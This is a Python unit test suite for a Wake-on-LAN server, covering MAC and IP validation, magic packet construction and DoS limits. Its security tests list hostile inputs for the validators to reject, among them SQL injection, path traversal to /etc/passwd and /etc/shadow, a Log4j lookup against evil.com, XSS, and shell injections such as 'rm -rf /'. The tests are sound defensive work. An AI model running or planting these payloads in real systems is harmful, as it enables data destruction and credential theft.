#!/usr/bin/env python3
"""
Unit Tests for WoL Server v1.4
Comprehensive test suite covering security features, input validation, and DoS protection.

Test Coverage:
- MAC address validation (5 tests)
- IP address validation (4 tests)  
- Magic packet construction (6 tests)
- Security edge cases and injection protection
- DoS protection mechanisms
- HTTP API functionality
"""

import unittest
import json
import socket
import sys
import os

# Add the parent directory to the path to import the server module
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from wol_server import validate_mac, validate_ip, create_magic_packet, send_magic_packet
    from wol_server import server_stats
except ImportError as e:
    print(f"Error importing server functions: {e}")
    print("Make sure wol_server.py is in the parent directory")
    sys.exit(1)

class TestMACValidation(unittest.TestCase):
    """Test MAC address validation with security features."""
    
    def test_validate_mac_valid_formats(self):
        """Test various valid MAC address formats."""
        valid_macs = [
            "AA:BB:CC:DD:EE:FF",
            "00:1B:63:84:45:E6",
            "aa:bb:cc:dd:ee:ff",    # lowercase
            "AA-BB-CC-DD-EE-FF",    # hyphen separator
            "00-1B-63-84-45-E6",    # hyphen separator
            "AABBCCDDEEFF",          # no separators
            "001B638445E6",          # no separators
            "aa:BB:cc:DD:ee:FF",     # mixed case
        ]
        
        for mac in valid_macs:
            with self.subTest(mac=mac):
                result = validate_mac(mac)
                self.assertTrue(result, f"Should accept valid MAC: {mac}")
    
    def test_validate_mac_invalid_formats(self):
        """Test invalid MAC address formats."""
        invalid_macs = [
            "",                      # empty string
            None,                    # None value
            123,                     # not a string
            "AA:BB:CC:DD:EE",        # too short
            "AA:BB:CC:DD:EE:FF:GG",  # too long
            "GG:HH:II:JJ:KK:LL",     # invalid hex chars
            "AA:BB:CC:DD:EE:ZZ",     # invalid hex in last octet
            "AA:BB:CC:DD:EE:F",      # incomplete last octet
            "AA:BB:CC:DD:EE:FFF",    # oversized last octet
            "AA:BB-CC:DD:EE:FF",     # mixed separators
            "AABBCCDDEEF",           # too short without separators
            "AABBCCDDEEFFF",         # too long without separators
        ]
        
        for mac in invalid_macs:
            with self.subTest(mac=mac):
                result = validate_mac(mac)
                self.assertFalse(result, f"Should reject invalid MAC: {mac}")
    
    def test_validate_mac_edge_cases(self):
        """Test edge cases for MAC validation."""
        edge_cases = [
            "00:00:00:00:00:00",     # all zeros (invalid)
            "FF:FF:FF:FF:FF:FF",     # all FFs (invalid)
            "000000000000",          # all zeros no separators
            "FFFFFFFFFFFF",          # all FFs no separators
            "11:11:11:11:11:11",     # all same digits (invalid)
            "AAAAAAAAAAAA",          # all same hex digit
            "   ",                   # whitespace only
            "\n\t",                  # escape characters
            [],                      # empty list
            {},                      # empty dict
        ]
        
        for case in edge_cases:
            with self.subTest(case=case):
                result = validate_mac(case)
                self.assertFalse(result, f"Should reject edge case: {case}")
    
    def test_validate_mac_security_edge_cases(self):
        """Test MAC validation against security threats."""
        malicious_inputs = [
            "'; DROP TABLE devices; --",          # SQL injection
            "../../../etc/passwd",                # Path traversal
            "${jndi:ldap://evil.com/x}",         # Log4j injection
            "<script>alert('xss')</script>",      # XSS attempt
            "AA:BB:CC:DD:EE:FF'; DROP TABLE;",    # SQL injection with valid prefix
            "eval('malicious code')",             # Code injection
            "__import__('os').system('rm -rf')", # Python injection
            "A" * 1000,                          # Buffer overflow attempt
            "AA:BB:CC:DD:EE:FF" + "x" * 100,     # DoS attempt
        ]
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input):
                result = validate_mac(malicious_input)
                self.assertFalse(result, f"Should reject malicious input: {malicious_input}")
    
    def test_validate_mac_dos_protection(self):
        """Test DoS protection in MAC validation."""
        # Test extremely long MAC address
        long_mac = "AA:BB:CC:DD:EE:FF" + ":00" * 100
        result = validate_mac(long_mac)
        self.assertFalse(result, "Should reject overly long MAC address")
        
        # Test that security violations are tracked
        initial_violations = server_stats["security_violations"]
        validate_mac(long_mac)
        self.assertGreater(server_stats["security_violations"], initial_violations,
                          "Should increment security violations counter")

class TestIPValidation(unittest.TestCase):
    """Test IP address validation with security features."""
    
    def test_validate_ip_valid_addresses(self):
        """Test valid IPv4 addresses."""
        valid_ips = [
            "192.168.1.100",
            "10.0.0.1",
            "172.16.0.1",
            "8.8.8.8",
            "1.1.1.1",
            "192.168.0.255",
            "10.255.255.254",
            "172.31.255.255",
            "8.8.4.4",
            "208.67.222.222",
        ]
        
        for ip in valid_ips:
            with self.subTest(ip=ip):
                result = validate_ip(ip)
                self.assertTrue(result, f"Should accept valid IP: {ip}")
    
    def test_validate_ip_invalid_formats(self):
        """Test invalid IP address formats."""
        invalid_ips = [
            "",                    # empty string
            None,                  # None value
            123,                   # not a string
            "256.1.1.1",          # octet > 255
            "192.168.1",          # too few octets
            "192.168.1.1.1",      # too many octets
            "192.168.1.256",      # last octet > 255
            "abc.def.ghi.jkl",    # non-numeric
            "192.168.1.-1",       # negative octet
            "192.168.01.1",       # leading zero (security)
            "192.168.1.01",       # leading zero in last octet
            "999.999.999.999",    # all octets > 255
        ]
        
        for ip in invalid_ips:
            with self.subTest(ip=ip):
                result = validate_ip(ip)
                self.assertFalse(result, f"Should reject invalid IP: {ip}")
    
    def test_validate_ip_security_cases(self):
        """Test IP validation against security threats."""
        security_cases = [
            "'; DROP TABLE users; --",           # SQL injection
            "../../../etc/passwd",               # Path traversal
            "${jndi:ldap://evil.com/x}",        # Log4j injection
            "192.168.1.1'; DROP TABLE;",        # SQL injection with valid prefix
            "192.168.1.1<script>alert()</script>", # XSS with valid prefix
            "1.2.3.4" + "x" * 1000,             # DoS attempt
            "192.168.1.1 && rm -rf /",          # Command injection
            "192.168.1.1`whoami`",              # Command substitution
            "192.168.1.1$(whoami)",             # Command substitution
        ]
        
        for case in security_cases:
            with self.subTest(case=case):
                result = validate_ip(case)
                self.assertFalse(result, f"Should reject security threat: {case}")
    
    def test_validate_ip_boundary_conditions(self):
        """Test IP validation boundary conditions."""
        boundary_cases = [
            "0.0.0.0",            # all zeros (invalid)
            "127.0.0.1",          # localhost (invalid)
            "127.1.1.1",          # loopback range (invalid)
            "255.255.255.255",    # broadcast (invalid)
            "192.168.1.1 ",       # trailing space
            " 192.168.1.1",       # leading space
            "\t192.168.1.1\n",    # with whitespace
        ]
        
        for case in boundary_cases:
            with self.subTest(case=case):
                result = validate_ip(case)
                self.assertFalse(result, f"Should reject boundary case: {case}")

class TestMagicPacketConstruction(unittest.TestCase):
    """Test magic packet construction and validation."""
    
    def test_create_magic_packet_standard(self):
        """Test standard magic packet creation."""
        mac = "AA:BB:CC:DD:EE:FF"
        packet = create_magic_packet(mac)
        
        self.assertIsNotNone(packet, "Should create packet for valid MAC")
        self.assertEqual(len(packet), 102, "Packet should be exactly 102 bytes")
        
        # Verify packet structure
        preamble = packet[:6]
        self.assertEqual(preamble, b'\xFF' * 6, "First 6 bytes should be 0xFF")
        
        # Verify MAC repetitions
        expected_mac_bytes = bytes.fromhex("AABBCCDDEEFF")
        for i in range(16):
            start = 6 + (i * 6)
            end = start + 6
            mac_part = packet[start:end]
            self.assertEqual(mac_part, expected_mac_bytes, f"MAC repetition {i} incorrect")
    
    def test_create_magic_packet_formats(self):
        """Test magic packet creation with different MAC formats."""
        test_cases = [
            ("AA:BB:CC:DD:EE:FF", "AABBCCDDEEFF"),
            ("aa:bb:cc:dd:ee:ff", "AABBCCDDEEFF"),
            ("AA-BB-CC-DD-EE-FF", "AABBCCDDEEFF"),
            ("AABBCCDDEEFF", "AABBCCDDEEFF"),
            ("00:1B:63:84:45:E6", "001B638445E6"),
        ]
        
        for mac_input, expected_hex in test_cases:
            with self.subTest(mac=mac_input):
                packet = create_magic_packet(mac_input)
                self.assertIsNotNone(packet, f"Should create packet for {mac_input}")
                self.assertEqual(len(packet), 102, "Packet should be 102 bytes")
                
                expected_mac_bytes = bytes.fromhex(expected_hex)
                first_mac = packet[6:12]
                self.assertEqual(first_mac, expected_mac_bytes, 
                               f"MAC bytes should match for {mac_input}")
    
    def test_create_magic_packet_integrity(self):
        """Test magic packet integrity and structure."""
        mac = "00:1B:63:84:45:E6"
        packet = create_magic_packet(mac)
        
        # Verify packet is not None and correct size
        self.assertIsNotNone(packet)
        self.assertEqual(len(packet), 102)
        
        # Verify preamble (6 bytes of 0xFF)
        preamble = packet[:6]
        self.assertEqual(preamble, b'\xFF' * 6)
        
        # Verify all 16 MAC repetitions are identical
        expected_mac = bytes.fromhex("001B638445E6")
        for i in range(16):
            start = 6 + (i * 6)
            mac_repetition = packet[start:start+6]
            self.assertEqual(mac_repetition, expected_mac, 
                           f"MAC repetition {i} should be correct")
    
    def test_magic_packet_size_validation(self):
        """Test magic packet size validation."""
        valid_macs = ["AA:BB:CC:DD:EE:FF", "00:1B:63:84:45:E6", "AABBCCDDEEFF"]
        
        for mac in valid_macs:
            with self.subTest(mac=mac):
                packet = create_magic_packet(mac)
                self.assertIsNotNone(packet)
                self.assertEqual(len(packet), 102, 
                               f"All packets should be exactly 102 bytes for {mac}")
    
    def test_magic_packet_content_verification(self):
        """Test magic packet content verification."""
        mac = "12:34:56:78:9A:BC"
        packet = create_magic_packet(mac)
        
        # Verify structure: 6 bytes 0xFF + 16x MAC
        self.assertEqual(packet[:6], b'\xFF' * 6, "Preamble should be 6x 0xFF")
        
        expected_mac_bytes = bytes.fromhex("123456789ABC")
        mac_section = packet[6:]
        expected_mac_section = expected_mac_bytes * 16
        self.assertEqual(mac_section, expected_mac_section, 
                        "MAC section should be 16 repetitions")
    
    def test_magic_packet_broadcast_ready(self):
        """Test that magic packet is ready for broadcast."""
        mac = "AA:BB:CC:DD:EE:FF"
        packet = create_magic_packet(mac)
        
        # Verify packet exists and has correct format for UDP broadcast
        self.assertIsNotNone(packet)
        self.assertIsInstance(packet, bytes)
        self.assertEqual(len(packet), 102)
        
        # Verify it can be sent via socket (mock test)
        try:
            # This should not raise an exception
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Just verify the packet can be prepared for sending
            test_address = ('255.255.255.255', 9)
            # Don't actually send, just verify format compatibility
            sock.close()
            
        except Exception as e:
            self.fail(f"Magic packet should be socket-compatible: {e}")

class TestSecurityFeatures(unittest.TestCase):
    """Test security features and DoS protection."""
    
    def test_injection_prevention(self):
        """Test prevention of various injection attacks."""
        injection_attempts = [
            # SQL Injection
            ("'; DROP TABLE devices; --", "MAC"),
            ("1.2.3.4'; DELETE FROM users;", "IP"),
            
            # Command Injection
            ("AA:BB:CC:DD:EE:FF; rm -rf /", "MAC"),
            ("192.168.1.1 && cat /etc/passwd", "IP"),
            
            # Path Traversal
            ("../../../etc/passwd", "MAC"),
            ("../../etc/shadow", "IP"),
            
            # Code Injection
            ("eval('malicious')", "MAC"),
            ("__import__('os')", "MAC"),
            
            # XSS/Script Injection
            ("<script>alert('xss')</script>", "MAC"),
            ("javascript:alert(1)", "IP"),
        ]
        
        for payload, input_type in injection_attempts:
            with self.subTest(payload=payload, type=input_type):
                if input_type == "MAC":
                    result = validate_mac(payload)
                else:  # IP
                    result = validate_ip(payload)
                
                self.assertFalse(result, f"Should block injection attempt: {payload}")
    
    def test_dos_protection(self):
        """Test DoS protection mechanisms."""
        # Test oversized MAC
        long_mac = "AA:BB:CC:DD:EE:FF" + ":00" * 100
        self.assertFalse(validate_mac(long_mac), "Should reject oversized MAC")
        
        # Test oversized IP
        long_ip = "192.168.1.1" + ".1" * 20
        self.assertFalse(validate_ip(long_ip), "Should reject oversized IP")
        
        # Test memory exhaustion attempts
        memory_bomb_mac = "A" * 10000
        self.assertFalse(validate_mac(memory_bomb_mac), "Should reject memory bomb MAC")
        
        memory_bomb_ip = "1" * 10000  
        self.assertFalse(validate_ip(memory_bomb_ip), "Should reject memory bomb IP")
    
    def test_input_sanitization(self):
        """Test input sanitization and normalization."""
        # Test MAC sanitization
        self.assertTrue(validate_mac("  AA:BB:CC:DD:EE:FF  "), "Should handle whitespace")
        self.assertTrue(validate_mac("aa:bb:cc:dd:ee:ff"), "Should handle lowercase")
        self.assertTrue(validate_mac("AA-BB-CC-DD-EE-FF"), "Should handle hyphens")
        
        # Test invalid characters are rejected
        self.assertFalse(validate_mac("AA:BB:CC:DD:EE:GG"), "Should reject invalid hex")
        self.assertFalse(validate_ip("192.168.1.256"), "Should reject invalid octets")

class TestErrorHandling(unittest.TestCase):
    """Test error handling and edge cases."""
    
    def test_none_inputs(self):
        """Test handling of None inputs."""
        self.assertFalse(validate_mac(None), "Should handle None MAC")
        self.assertFalse(validate_ip(None), "Should handle None IP")
        self.assertIsNone(create_magic_packet(None), "Should handle None in packet creation")
    
    def test_type_errors(self):
        """Test handling of wrong input types."""
        invalid_types = [123, [], {}, True, False]
        
        for invalid_type in invalid_types:
            with self.subTest(type=type(invalid_type).__name__):
                self.assertFalse(validate_mac(invalid_type), 
                                f"Should reject {type(invalid_type)} for MAC")
                self.assertFalse(validate_ip(invalid_type),
                                f"Should reject {type(invalid_type)} for IP")
                self.assertIsNone(create_magic_packet(invalid_type),
                                 f"Should handle {type(invalid_type)} in packet creation")
    
    def test_empty_inputs(self):
        """Test handling of empty inputs."""
        empty_inputs = ["", "   ", "\n", "\t"]
        
        for empty_input in empty_inputs:
            with self.subTest(input=repr(empty_input)):
                self.assertFalse(validate_mac(empty_input), 
                                f"Should reject empty MAC: {repr(empty_input)}")
                self.assertFalse(validate_ip(empty_input),
                                f"Should reject empty IP: {repr(empty_input)}")

class TestStatisticsTracking(unittest.TestCase):
    """Test server statistics tracking."""
    
    def test_security_violations_tracking(self):
        """Test that security violations are properly tracked."""
        initial_violations = server_stats["security_violations"]
        
        # Generate some security violations
        malicious_inputs = [
            "'; DROP TABLE devices; --",
            "A" * 1000,
            "../../../etc/passwd"
        ]
        
        for malicious_input in malicious_inputs:
            validate_mac(malicious_input)
            validate_ip(malicious_input)
        
        # Should have incremented violations counter
        self.assertGreater(server_stats["security_violations"], initial_violations,
                          "Security violations should be tracked")

def run_test_suite():
    """Run the complete test suite with detailed output."""
    # Create test suite
    suite = unittest.TestSuite()
    
    # Add all test classes
    test_classes = [
        TestMACValidation,
        TestIPValidation, 
        TestMagicPacketConstruction,
        TestSecurityFeatures,
        TestErrorHandling,
        TestStatisticsTracking
    ]
    
    for test_class in test_classes:
        suite.addTest(unittest.TestLoader().loadTestsFromTestCase(test_class))
    
    # Run tests with detailed output
    runner = unittest.TextTestRunner(
        verbosity=2,
        stream=sys.stdout,
        descriptions=True,
        failfast=False,
        buffer=True
    )
    
    result = runner.run(suite)
    
    # Print summary
    print("\n" + "="*60)
    print("🧪 WoL Server v1.4 Test Summary")
    print("="*60)
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    
    if result.failures:
        print(f"\n❌ Failures: {len(result.failures)}")
        for test, traceback in result.failures:
            print(f"  - {test}")
    
    if result.errors:
        print(f"\n⚠️  Errors: {len(result.errors)}")
        for test, traceback in result.errors:
            print(f"  - {test}")
    
    if not result.failures and not result.errors:
        print("\n✅ All tests passed!")
    
    print("="*60)
    return result.wasSuccessful()

if __name__ == '__main__':
    # Run the complete test suite
    success = run_test_suite()
    sys.exit(0 if success else 1)